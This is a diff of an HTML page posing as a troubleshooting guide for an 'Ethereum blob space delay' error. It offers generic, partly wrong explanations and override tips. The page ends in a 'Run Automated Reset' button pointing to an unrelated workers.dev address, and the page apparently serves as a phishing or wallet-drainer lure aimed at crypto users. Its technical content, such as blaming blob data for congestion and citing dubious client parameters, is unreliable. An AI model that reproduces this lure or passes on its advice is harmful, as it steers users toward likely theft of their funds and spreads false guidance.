@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: system-ui;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,38 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an Ethereum blob space delay.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar wording, which suggests that the network is currently overwhelmed and cannot process transactions at the expected speed.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to excessive blob data being stored on the Ethereum blockchain, causing network congestion and slowing down transaction processing times.</li>
+<li>The error occurs due to the Ethereum network's current limitations in handling a high volume of transactions, particularly those involving large amounts of data such as NFTs or complex smart contracts. When the network is congested, transactions may be delayed or fail as the network struggles to keep up with demand.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the <code>--http.cache.size</code> parameter to optimize caching and reduce the load on the network.</li>
-<li>Use a custom <code>eth.chainID</code> to specify a different chain and potentially avoid congested networks.</li>
-<li>Adjust the <code>gas</code> settings to prioritize transactions and reduce wait times, as shown in the following example:</li>
+<li>Increase the gas price to prioritize the transaction: this can help the transaction be processed faster, but at a higher cost.</li>
+<li>Use a transaction accelerator service: some services offer the ability to accelerate transactions for a fee.</li>
+<li>Edit the transaction manually using a command-line tool:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...address&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...address&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gasPrice&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="s1">&#39;{ </span>
+<span class="s1">  &quot;from&quot;: &quot;0x...your_address...&quot;, </span>
+<span class="s1">  &quot;to&quot;: &quot;0x...recipient_address...&quot;, </span>
+<span class="s1">  &quot;value&quot;: &quot;0x...amount...&quot;, </span>
+<span class="s1">  &quot;gas&quot;: &quot;0x...gas...&quot;, </span>
+<span class="s1">  &quot;gasPrice&quot;: &quot;0x...gas_price...&quot; </span>
+<span class="s1">}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
+<p>You may want to consider using an external console with more advanced features to diagnose and resolve the issue. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of Ethereum network architecture</li>
-<li>Familiarity with command-line interfaces and JSON formatting</li>
-<li>Access to a compatible Ethereum client or node</li>
+<li>Basic understanding of Ethereum transactions and gas mechanics</li>
+<li>Access to a command-line tool or Ethereum wallet software</li>
+<li>Knowledge of the Ethereum network's current congestion and gas price trends</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
